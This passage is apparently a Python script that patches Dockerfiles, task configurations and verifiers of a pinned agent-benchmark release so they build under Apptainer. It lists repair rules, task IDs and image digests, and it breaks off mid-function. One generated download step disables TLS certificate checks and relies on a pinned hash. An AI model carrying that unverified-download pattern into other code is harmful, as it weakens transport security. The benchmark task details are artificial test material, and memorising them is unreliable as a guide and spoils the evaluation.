"""Repair rules for the pinned full CalibForge Harbor source (revision fb1e75441a94b8bb0ced08acd6b59e711704d70a).

R1  FROM <repo>:<tag>@sha256:<64 hex>  ->  FROM <repo>@sha256:<64 hex>  (Apptainer rejects tag+digest;
    the digest already fixes the image content).
R2  shell-form RUN after a literal absolute WORKDIR  ->  RUN mkdir -p <wd> && cd <wd> && <cmd>
    (Harbor's Apptainer builder never changes directory in %post; Docker semantics are unchanged).
R3  instruction.md fenced block: after a line/segment `cd <abs>`, rewrite `./name` to `<abs>/name`.
R4  COPY <src> /tmp/<name> used only by RUN steps  ->  COPY to /opt/calibforge-build/tmp/<name>, with the
    same replacement in the RUN steps and a final removal of the staging directory (Apptainer mounts the
    build host's /tmp over the image's /tmp while RUN steps execute, hiding the copied files).
R5  ENV values that reference a variable (`ENV PATH="/opt/venv/bin:$PATH"`) are written with the value Docker
    substitutes, taken from the base image configuration and earlier ENV instructions (the Apptainer
    builder exports ENV values single-quoted, so `$PATH` stays literal and no command is found).
R6  COPY of a directory that is empty in the upstream image and therefore absent from the release
    ->  RUN mkdir -p <destination>  (listed tasks only; the builder stops at a missing COPY source).
R7  A listed task whose input files exist only in its published upstream image builds FROM that image,
    pinned by digest, instead of repeating the Dockerfile steps.
R8  COPY <glob> <dest>  ->  one COPY per build-context path the pattern matches, in sorted order (the
    Apptainer builder takes every COPY source as a literal path and stops at the wildcard).
R9  COPY into /etc, /usr, /var, /lib, /bin or /sbin after a RUN step  ->  COPY to /opt/calibforge-build/copy/<n>
    and a RUN at the same position that copies the staged files to the destination (the Apptainer builder
    copies every COPY source before the first RUN step, so a package installed later finds its
    configuration file already present and dpkg stops at the conffile prompt).
R10 Comment and blank lines inside a backslash-continued instruction are removed, as Docker's parser
    does (the Apptainer builder joins them into the command, where `#` comments out the rest).
R11 COPY --from=ghcr.io/astral-sh/uv:<version> /uv /uvx /bin/  ->  RUN that downloads the same release's
    static binaries, checked against a pinned SHA-256 (the builder has no COPY --from).
R12 A RUN command that sequences commands with `;` starts with `set +e`, so that, as in Docker, only
    its final status decides (the shared builder runs every RUN under `sh -e`).
R13 COPY of a directory whose entries have names with whitespace  ->  COPY of the nearest parent whose
    entries have plain names to the staging directory, and a RUN that copies the directory from there
    (the builder lists the entries of a copied directory in a whitespace-separated %files line).
R14 A Dockerfile whose RUN steps read build inputs below /tmp or /var/tmp in ways R4 cannot rewrite
    (scripts that name the paths, relative paths after `cd /tmp`) keeps the paths: the files are copied to
    the staging directory and every RUN runs in a private mount namespace with it mounted on /tmp and
    /var/tmp, so the steps share one image-local temporary directory as Docker layers do.
R15 A listed task whose Dockerfile copies files out of a separate build stage builds FROM its published
    upstream image, pinned by digest (the builder has neither build stages nor COPY --from).
R16 RUN <command> <<DELIMITER with its body  ->  RUN printf '%s\\n' '<line>' ... | <command>  (the
    builder reads a Dockerfile line by line and drops the body, so the command ran on empty input).
R17 `ulimit -c unlimited` in a listed build script  ->  `ulimit -c unlimited || true`  (build steps on the
    compute nodes cannot raise the core file limit; the script writes its dump with gcore, which does not
    use that limit, and the script is deleted from the image by the same RUN step).
R18 Remove the three apt tool-version pins in the reviewed sensor-log debugging task. The task
    requires build/debugging tools, not these exact versions; retain packages and installation flags.
X   Listed tasks are excluded and archived: the Dockerfile must run a server under an unprivileged
    account while the image is built (the build backend has a single user ID), the Dockerfile must bind
    port 80 while the image is built (an unprivileged build step may not), or the task's evidence
    files live below /tmp or /var/tmp (task containers start with both directories empty).
A   Tasks whose environments differ only in top-level Dockerfile comments, blank lines and trailing
    whitespace receive the Dockerfile of the smallest task ID in the group, so they share one image.
B1  The installation commands that tests/test.sh runs before its checks, and one warm-up of its exact
    `uvx ... pytest` options, are appended to the Dockerfile as a final RUN (no additional images).
B2  A leading block of installation commands moves unchanged from tests/test.sh to tests/setup.sh, the
    preparation script the shared runner executes and times before test.sh.

Instructions change only through R3. V1 adds explicitly user-authorized missing-output
assertions to ten test_outputs.py files; V2 asserts the pandas dependency before loading its
verifier. V3 moves expected PostgreSQL connection and Go service-build failures from
fixture setup into test assertions. Original behavioral checks remain when prerequisites
are available. C1 removes ignored agent resource fields from two task.toml files only when
identical values already exist under environment. The pytest command, its arguments and
reward handling are unchanged. Heredoc RUN lines are left alone and listed in the manifest, as are
verifier scripts whose installation commands are not a clean leading block.
"""

# Support both direct execution and python -m data.<source>.patch.
import sys
from pathlib import Path
sys.path.insert(0, str(Path(__file__).resolve().parents[2]))


import argparse
import hashlib
import io
import json
from pathlib import Path
import re
import shlex
import tarfile
import tomllib

import pyarrow as pa
import pyarrow.parquet as pq

import fnmatch
import posixpath

REVISION = "fb1e75441a94b8bb0ced08acd6b59e711704d70a"

FROM_LINE = re.compile(r"^(?P<head>\s*FROM\s+(?:--\S+\s+)*)(?P<ref>\S+)(?P<tail>.*)$", re.I)
TAG_AND_DIGEST = re.compile(r"^(?P<repo>[^\s@]+?):(?P<tag>[^:@/\s]+)@(?P<digest>sha256:[0-9a-f]{64})$")
WORKDIR_LINE = re.compile(r"^\s*WORKDIR\s+(?P<path>\S+)\s*$", re.I)
RUN_LINE = re.compile(r"^(?P<head>\s*RUN[ \t]+)(?P<cmd>.*)$", re.I | re.S)
CD_SEGMENT = re.compile(r"^cd\s+(/[^\s'\"$`;&|]*)$")
DOT_SLASH_TOKEN = re.compile(r"(?<![\w./~$-])\./(?=\w)")
QUOTED = re.compile(r"'[^']*'|\"(?:[^\"\\]|\\.)*\"")
SEQUENCE = re.compile(r"(?<!\\);")


def sha256(data):
    return hashlib.sha256(data).hexdigest()


# ---- tar helpers -------------------------------------------------------------------------------

def read_task(binary):
    members = []
    with tarfile.open(fileobj=io.BytesIO(binary), mode="r:*") as archive:
        for info in archive.getmembers():
            members.append((info, archive.extractfile(info).read() if info.isfile() else None))
    return members


def write_task(members):
    buffer = io.BytesIO()
    with tarfile.open(fileobj=buffer, mode="w") as archive:
        for info, data in members:
            if data is not None:
                info.size = len(data)
            archive.addfile(info, io.BytesIO(data) if data is not None else None)
    return buffer.getvalue()


# ---- Dockerfile rules (R1, R2) -----------------------------------------------------------------

def logical_instructions(lines):
    """Yield (first_index, last_index) of each instruction, joining backslash continuations."""
    i = 0
    while i < len(lines):
        j = i
        while j + 1 < len(lines) and lines[j].rstrip("\r").rstrip().endswith("\\"):
            j += 1
        yield i, j
        i = j + 1


APT_TOOL_PIN_TASK = "contrastive_solver-debugging_20260611_112034_004"
APT_TOOL_PINS = (
    "build-essential=12.10ubuntu1",
    "gdb=15.0.50.20240403-0ubuntu1",
    "valgrind=1:3.22.0-0ubuntu3",
)


def unpin_reviewed_apt_tools(task_id, text):
    """R18: only rewrite the reviewed install stanza; reject source drift."""
    if task_id != APT_TOOL_PIN_TASK:
        return text, []
    start = "apt-get install -y --no-install-recommends \\\n"
    end = "    && rm -rf /var/lib/apt/lists/*"
    old = start + ''.join(f"    {pin} \\\n" for pin in APT_TOOL_PINS) + end
    new = start + ''.join(f"    {pin.split('=')[0]} \\\n" for pin in APT_TOOL_PINS) + end
    if old not in text and text.count(new) == 1:
        return text, []
    if text.count(old) != 1:
        raise ValueError(f"{task_id}: reviewed apt tool install stanza changed")
    return text.replace(old, new), list(APT_TOOL_PINS)


REDUNDANT_AGENT_RESOURCE_TASKS = {
    "contrastive_solver-data-processing_20260606_172622_004",
    "contrastive_solver-software-engineering_20260603_181444_003",
}
VERIFIER_PREPARATION_COMMENT = "# Verifier preparation from tests/test.sh, installed at build time."


def remove_redundant_agent_resources(task_id, text):
    """Remove ignored resource keys only when the environment already agrees."""
    if task_id not in REDUNDANT_AGENT_RESOURCE_TASKS:
        return text, []
    raw = tomllib.loads(text)
    agent, environment = raw.get('agent', {}), raw.get('environment', {})
    keys = [key for key in ('cpus', 'memory', 'storage') if key in agent]
    if any(key not in environment or agent[key] != environment[key] for key in keys):
        raise ValueError(f"{task_id}: agent resources differ from environment resources")
    section, kept, removed = '', [], []
    for line in text.splitlines(keepends=True):
        if line.lstrip().startswith('['):
            section = line.split('#', 1)[0].strip()
        match = re.match(r'^\s*(cpus|memory|storage)\s*=', line)
        if section == '[agent]' and match and match[1] in keys:
            removed.append(match[1])
        else:
            kept.append(line)
    if set(removed) != set(keys):
        raise ValueError(f"{task_id}: unsupported agent resource syntax")
    result = ''.join(kept)
    expected = {**raw, 'agent': {k: v for k, v in agent.items() if k not in keys}}
    if tomllib.loads(result) != expected:
        raise ValueError(f"{task_id}: resource cleanup changed unrelated configuration")
    return result, removed


def patch_dockerfile(task_id, text):
    """Return (new_text, info). info lists R1, R2 and R12 rewrites and skipped heredoc RUNs."""
    lines = text.split("\n")
    info = {"R1": [], "R2": 0, "R12": 0, "heredoc_run_skipped": 0}
    workdir = None
    for first, last in logical_instructions(lines):
        match = FROM_LINE.match(lines[first])
        if match:
            workdir = None  # a new build stage starts without the previous WORKDIR
            ref = match.group("ref")
            if "@" in ref:
                parts = TAG_AND_DIGEST.match(ref)
                if parts:
                    lines[first] = f"{match.group('head')}{parts['repo']}@{parts['digest']}{match.group('tail')}"
                    info["R1"].append(ref)
                elif not re.search(r"@sha256:[0-9a-f]{64}$", ref):
                    raise ValueError(f"{task_id}: FROM digest is not sha256 with 64 hex characters: {ref}")
            continue
        match = WORKDIR_LINE.match(lines[first])
        if match and first == last:
            path = match.group("path")
            workdir = path if path.startswith("/") and path != "/" and not re.search(r"[$\s]", path) else None
            continue
        logical = "\n".join(lines[first:last + 1])
        match = RUN_LINE.match(logical)
        if not match:
            continue
        command = match.group("cmd")
        if command.startswith(("[", "--")):
            continue  # exec form and RUN --flag are excluded
        sequenced = bool(SEQUENCE.search(QUOTED.sub("", command)))
        if workdir is None and not sequenced:
            continue
        if "<<" in command:
            info["heredoc_run_skipped"] += workdir is not None
            continue
        if workdir is not None:
            quoted = shlex.quote(workdir)
            command = f"mkdir -p {quoted} && cd {quoted} && {command}"
            info["R2"] += 1
        if sequenced:
            command = "set +e; " + command
            info["R12"] += 1
        # Rewriting keeps the line count, so indices of later instructions stay valid.
        lines[first:last + 1] = (match.group("head") + command).split("\n")
    return "\n".join(lines), info


# ---- ENV references (R5) -----------------------------------------------------------------------

# PATH from the configuration of each base image (registry-1.docker.io, linux/amd64, read 2026-10-09).
DEBIAN_PATH = "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
VERIFIER_BASE = "aweaiteam/calibforge@sha256:0f61b2776c40231d5d868278ed6042295ddbc9d24b036cd72f0b88ebe9bd621a"
BASE_PATH = {
    "ubuntu:24.04": DEBIAN_PATH,
    "python:3.11-slim": "/usr/local/bin:" + DEBIAN_PATH,
    "python:3.13-slim-bookworm": "/usr/local/bin:" + DEBIAN_PATH,
    VERIFIER_BASE: "/opt/verifier/bin:/usr/local/bin:" + DEBIAN_PATH,
}
# Variables none of these images sets; Docker substitutes the empty string for them.
UNSET_IN_BASE = {"PYTHONPATH", "LD_LIBRARY_PATH"}
ENV_LINE = re.compile(r"^(?P<head>\s*ENV[ \t]+)(?P<body>.*)$", re.I | re.S)
ENV_REFERENCE = re.compile(r"\$(?:(\w+)|\{(\w+)\})")


def base_key(ref):
    parts = TAG_AND_DIGEST.match(ref)
    return f"{parts['repo']}@{parts['digest']}" if parts else ref


def resolve_env_references(text):
    """Return (new_text, rewritten ENV instructions, reason an instruction was left alone)."""
    lines = text.split("\n")
    env, count, reason = None, 0, None
    for first, last in logical_instructions(lines):
        match = FROM_LINE.match(lines[first])
        if match:
            path = BASE_PATH.get(base_key(match.group("ref")))
            env = {"PATH": path} if path else None
            continue
        match = ENV_LINE.match("\n".join(lines[first:last + 1]))
        if not match:
            continue
        body = match.group("body")
        if "$" in body:
            names = {a or b for a, b in ENV_REFERENCE.findall(body)}
            if env is None:
                reason = "base image environment is not recorded"
            elif "'" in body or "\\$" in body or re.search(r"\$(?!\w|\{\w+\})", body):
                reason = "quoting or expansion form is not handled"
            elif not names <= env.keys() | UNSET_IN_BASE:
                reason = "variable is not known: " + ", ".join(sorted(names - env.keys() - UNSET_IN_BASE))
            else:
                # Docker substitutes the values from before this instruction, also for names it sets.
                body = ENV_REFERENCE.sub(lambda m: env.get(m.group(1) or m.group(2), ""), body)
                lines[first:last + 1] = (match.group("head") + body).split("\n")
                count += 1
        if env is None:
            continue
        try:
            words = shlex.split(flatten(body))
        except ValueError:
            words = []
        if "$" in body or not words:
            env = None  # values after an unresolved instruction are unknown
        elif "=" in words[0]:
            env.update(word.split("=", 1) for word in words if "=" in word)
        else:
            env[words[0]] = flatten(body).split(None, 1)[1] if len(words) > 1 else ""
    return "\n".join(lines), count, reason


# ---- build context gaps (R6, R7) ---------------------------------------------------------------

UPSTREAM_IMAGES = "aweaiteam/calibforge"
GLOB = re.compile(r"[*?\[]")
# The release has no empty directories, so these COPY sources are missing. Each task's published image
# (task.toml docker_image, digest below) has an empty layer or an empty 0755 directory for the step.
EMPTY_DIRECTORY_COPIES = {
    "contrastive_solver-data-science_20260601_053159_001":
        ("COPY files/data/ /app/data/", "sha256:39384c98fa1c17321a69db57d70010d8f13798192c89820ff983f976bddda33c"),
    "contrastive_solver-software-engineering_20260509_205636_020":
        ("COPY files/docs /app/docs/", "sha256:30c4dfe14daf194918039f616cecda04ae08e376cfece65d0c62d31e719db180"),
    "contrastive_solver-system-administration_20260615_143301_004":
        ("COPY files/ /app/", "sha256:195cd5545459932155ed805cb35f71c0c30960240f2afa1fed5326174c39c586"),
    "multi_solver-security_20260414_091921_001":
        ("COPY files/secrets/ /app/secrets/", "sha256:cfdbbc95d8f6286d37120a32db39f3d721f45c24675516c37ffff0260b8cba78"),
    "multi_solver-software-engineering_20260413_173854_016":
        ("COPY files/include /app/include", "sha256:a955f2903c48bdf234df7d1a09c4b339c2bde50c8794e9b6a55a11a0f2ac5a54"),
}
# The task's only inputs are compiled Python files that are in the published image but not in the release:
# /app/challenge.pyc (3,285 bytes), and /app/obfuscated/{crypto_utils,data_structures,network_tools}.pyc
# (2,640, 5,201 and 3,005 bytes).
UPSTREAM_IMAGE_TASKS = {
    "multi_solver-software-engineering_20260416_031414_006":
        ("COPY files/challenge.pyc /app/challenge.pyc", "/app",
         "sha256:2896c519197d252fb8427e65607696319430bffbaad2cca32a565c720d735f0e"),
    "multi_solver-software-engineering_20260414_091921_021":
        ("COPY files/obfuscated/*.pyc /app/obfuscated/", "/app",
         "sha256:84256536e909dfe6a096a2814c09c4962495fa5a3200e6315e6c48ee21b7d8a7"),
}


def copy_sources(text):
    """Literal context paths named as COPY or ADD sources, as (source, instruction) pairs."""
    lines = text.split("\n")
    for first, last in logical_instructions(lines):
        words = flatten("\n".join(lines[first:last + 1])).split()
        if not words or words[0].upper() not in ("COPY", "ADD") or "<<" in " ".join(words):
            continue
        if any(word.startswith(("--from", "[")) for word in words[1:]):
            continue
        for source in [word for word in words[1:] if not word.startswith("--")][:-1]:
            if not re.search(r"[$]|^https?://", source):
                yield posixpath.normpath(source), " ".join(words)


def glob_matches(pattern, context):
    """Build-context paths a COPY wildcard matches. As in Docker, a wildcard does not cross `/`."""
    parts = posixpath.normpath(pattern).split("/")
    return sorted(path for path in context if path.count("/") == len(parts) - 1
                  and all(fnmatch.fnmatchcase(name, part) for name, part in zip(path.split("/"), parts)))


def missing_copy_sources(text, context):
    return sorted({instruction for source, instruction in copy_sources(text)
                   if (not glob_matches(source, context) if GLOB.search(source) else
                       source != "." and source not in context
                       and not any(path.startswith(source + "/") for path in context))})


def restore_empty_directory(task_id, text, context):
    """R6: replace the listed COPY of an absent, upstream-empty directory by creating its destination."""
    instruction, _ = EMPTY_DIRECTORY_COPIES[task_id]
    lines = text.split("\n")
    if lines.count(instruction) != 1 or missing_copy_sources(text, context) != [instruction]:
        raise ValueError(f"{task_id}: expected exactly one missing COPY source, {instruction}")
    destination = instruction.split()[-1].rstrip("/")
    lines[lines.index(instruction)] = f"RUN mkdir -p {destination}"
    return "\n".join(lines), destination


def upstream_image_dockerfile(task_id, text, context):
    """R7: the published image already holds the result of every Dockerfile step."""
    instruction, workdir, digest = UPSTREAM_IMAGE_TASKS[task_id]
    lines = text.split("\n")
    names = {lines[first].split()[0].upper() for first, _ in logical_instructions(lines)
             if lines[first].strip() and not lines[first].lstrip().startswith("#")}
    if missing_copy_sources(text, context) != [instruction] or names - {"FROM", "WORKDIR", "RUN", "COPY"} \
            or re.findall(r"^\s*WORKDIR\s+(\S+)\s*$", text, re.M | re.I) != [workdir]:
        raise ValueError(f"{task_id}: Dockerfile differs from the one the published image was checked against")
    return f"FROM {UPSTREAM_IMAGES}@{digest}\n\nWORKDIR {workdir}\n", digest


# ---- COPY wildcards (R8) -----------------------------------------------------------------------

def expand_copy_globs(text, context):
    """Return (new_text, expanded COPY instructions, reason an instruction was left alone)."""
    lines = text.split("\n")
    output, count, reason = [], 0, None
    for first, last in logical_instructions(lines):
        logical = lines[first:last + 1]
        words = flatten("\n".join(logical)).split()
        if words and words[0].upper() in ("COPY", "ADD") and any(GLOB.search(word) for word in words[1:-1]):
            sources = [match for word in words[1:-1] for match in (glob_matches(word, context) if GLOB.search(word) else [word])]
            if words[0].upper() == "ADD" or "<<" in " ".join(words) or any(word.startswith(("--", "[")) or "$" in word for word in words[1:]):
                reason = "unsupported COPY or ADD form"
            elif not all(glob_matches(word, context) for word in words[1:-1] if GLOB.search(word)):
                reason = "wildcard matches nothing in the build context"
            elif len(sources) > 1 and not words[-1].endswith("/"):
                reason = "several sources for a destination without a trailing slash"
            else:
                logical = [f"COPY {source} {words[-1]}" for source in sources]
                count += 1
        output.extend(logical)
    return "\n".join(output), count, reason


# ---- COPY after RUN into package-managed directories (R9) ---------------------------------------

STAGING = "/opt/calibforge-build"
REMOVE_STAGING = ["", "# Remove the build input staging directory.", f"RUN rm -rf {STAGING}", ""]
PACKAGE_MANAGED = re.compile(r"^/(?:etc|usr|var|lib|lib64|bin|sbin)(?:/|$)")


def restore_copy_order(text, directories):
    """Return (new_text, restored COPY instructions, reason_not_applied).

    Docker applies COPY where it stands; the Apptainer builder applies every COPY before the first RUN.
    A COPY that follows a RUN and writes below a directory that packages install into is therefore
    staged, and a RUN at its position copies the staged files as Docker's COPY does: a directory's
    contents merge into the destination, a file replaces the destination path (or goes into it if it is
    a directory), and mode and ownership are kept.
    """
    lines = text.split("\n")
    instructions = [(i, j, "\n".join(lines[i:j + 1])) for i, j in logical_instructions(lines)]
    output, count, seen_run = [], 0, False
    for i, j, logical in instructions:
        words = flatten(logical).split()
        if RUN_LINE.match(logical):
            seen_run = True
        if not (seen_run and words and words[0].upper() in ("COPY", "ADD") and len(words) > 2
                and PACKAGE_MANAGED.match(words[-1]) and not TMP_DESTINATION.match(words[-1])):
            output.extend(logical.split("\n"))
            continue
        if words[0].upper() == "ADD" or any(word.startswith(("--", "[")) or re.search(r"[*?\[$'\"\\]", word) for word in words[1:]):
            return text, 0, "unsupported COPY or ADD form"
        if "<<" in text or len([1 for _, _, other in instructions if FROM_LINE.match(other)]) != 1:
            return text, 0, "heredoc or several build stages"
        destination, commands = words[-1], []
        for source in words[1:-1]:
            path = posixpath.normpath(source)
            if path.startswith(("/", "..")):
                return text, 0, "unsupported COPY source"
            staged = f"{STAGING}/copy/{count}"
            count += 1
            if path in directories or path == ".":
                output.append(f"COPY {source} {staged}/")
                target = destination.rstrip("/") or "/"
                commands.append(f"mkdir -p {target} && cp -a --remove-destination {staged}/. {target}/")
            else:
                staged += "/" + posixpath.basename(path)
                output.append(f"COPY {source} {staged}")
                parent = destination if destination.endswith("/") else posixpath.dirname(destination)
                commands.append(f"mkdir -p {parent} && cp -a --remove-destination {staged} {destination}")
        output.append("RUN " + " && ".join(commands))
    if not count:
        return text, 0, None
    while output and not output[-1].strip():
        output.pop()
    if output[-1].rstrip().endswith("\\"):
        return text, 0, "Dockerfile ends inside a continued instruction"
    if output[-2:] != REMOVE_STAGING[1:-1]:
        output += REMOVE_STAGING[:-1]
    return "\n".join(output + [""]), count, None


# ---- Docker parser and builder differences (R10, R11, R13, R15) ---------------------------------

HEREDOC_INSTRUCTION = re.compile(r"^\s*(?:RUN|COPY|ADD)\b.*<<-?\s*['\"]?[A-Za-z_]", re.I | re.M)


HEREDOC_RUN = re.compile(r"^(?P<head>\s*RUN\s+)(?P<before>.*?)<<(?P<dash>-?)\s*(?P<quote>['\"]?)(?P<word>\w+)(?P=quote)(?P<after>.*)$",
                         re.I)


def inline_heredocs(text):
    """R16. Returns (new_text, converted RUN steps, reason a heredoc was left alone)."""
    lines = text.split("\n")
    output, count, reason, index, continued = [], 0, None, 0, False
    while index < len(lines):
        line = lines[index]
        match = None if continued else HEREDOC_RUN.match(line)
        if not match:
            output.append(line)
            continued = line.rstrip().endswith("\\") and (continued or not line.lstrip().startswith("#"))
            index += 1
            continue
        end = next((k for k in range(index + 1, len(lines))
                    if (lines[k].lstrip("\t") if match["dash"] else lines[k]) == match["word"]), None)
        body = lines[index + 1:end] if end is not None else []
        command = (match["before"] + match["after"]).strip()
        if end is None or not command or re.search(r"<<|[|;&\\]", command):
            reason = "heredoc form is not handled"
        elif not match["quote"] and any(re.search(r"[$`\\]", item) for item in body):
            reason = "heredoc body is subject to shell expansion"
        if reason:
            return text, 0, reason
        if match["dash"]:
            body = [item.lstrip("\t") for item in body]
        output.append(f"{match['head']}printf '%s\\n' {' '.join(map(shlex.quote, body))} | {command}")
        count += 1
        index = end + 1
    return "\n".join(output), count, None


def strip_continuation_comments(text):
    """R10: drop comment and blank lines inside a continued instruction. Returns (new_text, removed)."""
    if HEREDOC_INSTRUCTION.search(text):
        return text, 0
    output, removed, continued = [], 0, False
    for line in text.split("\n"):
        stripped = line.strip()
        if continued and (not stripped or stripped.startswith("#")):
            removed += 1
            continue
        output.append(line)
        # A top-level comment never starts a continuation.
        continued = stripped.endswith("\\") and (continued or not stripped.startswith("#"))
    return "\n".join(output), removed


# Release archives uv-x86_64-unknown-linux-musl.tar.gz, the static binaries the ghcr.io/astral-sh/uv
# image ships as /uv and /uvx (SHA-256 from the release's .sha256 files, read 2026-10-12).
UV_RELEASE_SHA256 = {
    "0.8.14": "e018287fb321c3c633df2b622c2cf53042caa5c4c43a4ca6431bcb38e0685fa4",
    "0.8.15": "d0fec58f3124e05e0a1af0f6541abfce4333253cdaf23c7b6bb2e6128bf138ea",
}
UV_IMAGE_COPY = re.compile(r"^COPY --from=ghcr\.io/astral-sh/uv:(?P<version>[\w.]+) /uv /uvx /bin/$")
UV_STAGING = "/opt/.calibforge-uv"


def uv_release_step(version):
    # apt's own downloader is in every base image; the pinned hash authenticates the archive, so the
    # step does not depend on a CA bundle that several of the images lack.
    url = f"https://github.com/astral-sh/uv/releases/download/{version}/uv-x86_64-unknown-linux-musl.tar.gz"
    return (f"RUN mkdir -p {UV_STAGING} && /usr/lib/apt/apt-helper -o Acquire::https::Verify-Peer=false "
            f"-o Acquire::https::Verify-Host=false download-file {url} {UV_STAGING}/uv.tar.gz "
            f"SHA256:{UV_RELEASE_SHA256[version]} && tar -xzf {UV_STAGING}/uv.tar.gz -C {UV_STAGING} "
            f"--strip-components=1 --no-same-owner && install -m 0755 {UV_STAGING}/uv {UV_STAGING}/uvx /bin/ "
            f"&& rm -rf {UV_STAGING}")


def replace_uv_image_copies(task_id, text):
    """R11 for the one COPY --from form the release uses with an external image. Returns (text, versions)."""
    lines, versions = text.split("\n"), []
    for index, line in enumerate(lines):
        match = UV_IMAGE_COPY.match(line.strip())
        if match:
            if match["version"] not in UV_RELEASE_SHA256:
                raise ValueError(f"{task_id}: no pinned uv release for {line.strip()}")
            lines[index] = uv_release_step(match["version"])
            versions.append(match["version"])
    return "\n".join(lines), versions


# Published images (task.toml docker_image, manifest digest and configuration read 2026-10-12): the
# last history entries are the final stage's COPY steps and WORKDIR /app.
BUILD_STAGE_TASKS = {
    "multi_solver-data-science_20260414_211532_007":
        ("/app", "sha256:e9c6f0bd9a6c4b2dd1a4f7953e2e9ed90202fec25eabdaef02b6d2d0dfa768cf"),
    "contrastive_solver-scientific-computing_20260604_003113_006":
        ("/app", "sha256:5655d8be4151c554cf307755af51f40c390930e93fd027ecff22c9f0408f56d0"),
}


def build_stage_dockerfile(task_id, text):
    """R15: the published image is the result of the Dockerfile's final stage."""
    workdir, digest = BUILD_STAGE_TASKS[task_id]
    stages = re.findall(r"^\s*FROM\s+\S+\s+AS\s+(\S+)\s*$", text, re.M | re.I)
    if len(re.findall(r"^\s*FROM\s", text, re.M | re.I)) != 2 or len(stages) != 1 \
            or f"COPY --from={stages[0]} " not in text \
            or re.findall(r"^\s*WORKDIR\s+(\S+)\s*$", text, re.M | re.I)[-1] != workdir:
        raise ValueError(f"{task_id}: Dockerfile differs from the one the published image was checked against")
    return f"FROM {UPSTREAM_IMAGES}@{digest}\n\nWORKDIR {workdir}\n", digest


PLAIN_NAME = re.compile(r"^[\w.+@%,:=~-]+$")


def stage_unsafe_directory_copies(text, context):
    """R13. Returns (new_text, staged COPY instructions, reason an instruction was left alone)."""
    def children(directory):
        prefix = "" if directory == "." else directory + "/"
        return {path[len(prefix):].split("/")[0] for path in context if path.startswith(prefix) and path != directory}

    lines = text.split("\n")
    output, count, reason = [], 0, None
    for first, last in logical_instructions(lines):
        logical = lines[first:last + 1]
        words = flatten("\n".join(logical)).split()
        source = posixpath.normpath(words[1]) if len(words) == 3 and words[0].upper() == "COPY" else None
        if source is None or source.startswith(("/", "..", "-")) or GLOB.search(source) or "$" in source \
                or not children(source) or all(PLAIN_NAME.match(name) for name in children(source)):
            if len(words) > 3 and words[0].upper() == "COPY" and not words[1].startswith("--") and any(
                    not PLAIN_NAME.match(name) for word in words[1:-1] for name in children(posixpath.normpath(word))):
                reason = "several sources"
            output.extend(logical)
            continue
        parent = posixpath.dirname(source) or "."
        while parent != "." and not all(PLAIN_NAME.match(name) for name in children(parent)):
            parent = posixpath.dirname(parent) or "."
        if not all(PLAIN_NAME.match(name) for name in children(parent)) or TMP_DESTINATION.match(words[2]):
            reason = "no parent directory with plain entry names"
            output.extend(logical)
            continue
        staged = f"{STAGING}/dir/{count}"
        count += 1
        target = words[2].rstrip("/") or "/"
        output.append(f"COPY {'.' if parent == '.' else parent + '/'} {staged}/")
        output.append(f"RUN mkdir -p {target} && cp -a {staged}/{posixpath.relpath(source, parent)}/. {target}/")
    if not count:
        return text, 0, reason
    while output and not output[-1].strip():
        output.pop()
    if "<<" in text or output[-1].rstrip().endswith("\\"):
        return text, 0, "heredoc or continued final instruction"
    if output[-2:] != REMOVE_STAGING[1:-1]:
        output += REMOVE_STAGING[:-1]
    return "\n".join(output + [""]), count, reason


# ---- build scripts (R17) -----------------------------------------------------------------------

# Image prebuild job 999745 (generation-0008/image-prebuild/array/shards/0017/evidence.tar.gz, member
# image-build-logs/f08776d9525e.build.log): `bash /app/setup.sh` ends with "/app/setup.sh: line 11: ulimit:
# core file size: cannot modify limit: Operation not permitted" under `set -e`. The script then takes the
# dump with `gcore`, which writes it from gdb whatever the limit is.
CORE_LIMIT_SCRIPTS = {
    "contrastive_solver-security_20260510_125534_006": "environment/files/setup.sh",
}
CORE_LIMIT_LINE = re.compile(r"^ulimit -c unlimited$", re.M)


def tolerate_core_limit(text):
    return CORE_LIMIT_LINE.subn("ulimit -c unlimited || true", text)


# ---- private build /tmp (R14) -------------------------------------------------------------------

PRIVATE_TMP = {"/tmp": STAGING + "/tmp", "/var/tmp": STAGING + "/var-tmp"}
LOCAL_ARCHIVE = re.compile(r"\.(?:tar|tar\.gz|tgz|tar\.bz2|tar\.xz)$")


TMP_USE = re.compile(r"(?<![\w./$}-])(?:/var)?/tmp(?![\w.-])")


def run_steps(text):
    lines = text.split("\n")
    return [logical for logical in ("\n".join(lines[i:j + 1]) for i, j in logical_instructions(lines))
            if RUN_LINE.match(logical)]


def unrewritten_tmp_use(text, staged):
    """True if, after R4, a RUN step still reaches a staged file through /tmp.

    That is by `cd`, by a longer name, or by naming the directory the file was copied into on its own
    (`sys.path.insert(0, '/tmp')`).
    """
    if not staged:
        return False
    commands = "\n".join(RUN_LINE.match(logical)["cmd"] for logical in run_steps(text))
    return bool(re.search(r"\bcd (?:/var)?/tmp(?![\w./-])", commands)) or any(
        re.search(r"(?<![\w./$}-])" + re.escape(prefix) + r"[\w.-]", commands)
        or re.search(r"(?<![\w./$}-])" + re.escape(posixpath.dirname(prefix)) + r"(?![\w./-])", commands)
        for prefix in staged)


def private_tmp_copies(text):
    """R14, first part: COPY and ADD destinations below /tmp and /var/tmp move to the staging directory.

    Returns (new_text, moved instructions, reason_not_applied). ADD of a local archive becomes a COPY of
    the archive and a RUN that unpacks it into the destination, which is what ADD does.
    """
    lines = text.split("\n")
    instructions = [(i, j, "\n".join(lines[i:j + 1])) for i, j in logical_instructions(lines)]
    if HEREDOC_INSTRUCTION.search(text) or len([1 for _, _, logical in instructions if FROM_LINE.match(logical)]) != 1:
        return text, 0, "heredoc or several build stages"
    output, count = [], 0
    for _, _, logical in instructions:
        words = flatten(logical).split()
        match = TMP_DESTINATION.match(words[-1]) if words and words[0].upper() in ("COPY", "ADD") and len(words) > 2 else None
        if not match:
            output.extend(logical.split("\n"))
            continue
        if any(word.startswith(("--", "[")) or re.search(r"[$'\"\\]|^https?://", word) for word in words[1:]):
            return text, 0, "unsupported COPY or ADD form"
        destination = PRIVATE_TMP[match["root"]] + words[-1][len(match["root"]):]
        if words[0].upper() == "COPY":
            output.append(" ".join(["COPY", *words[1:-1], destination]))
        elif len(words) == 3 and LOCAL_ARCHIVE.search(words[1]) and words[2].endswith("/"):
            staged = f"{STAGING}/add/{count}"
            output.append(f"COPY {words[1]} {staged}/")
            output.append(f"RUN mkdir -p {words[2]} && tar -xf {staged}/{posixpath.basename(words[1])} -C {words[2]}")
        else:
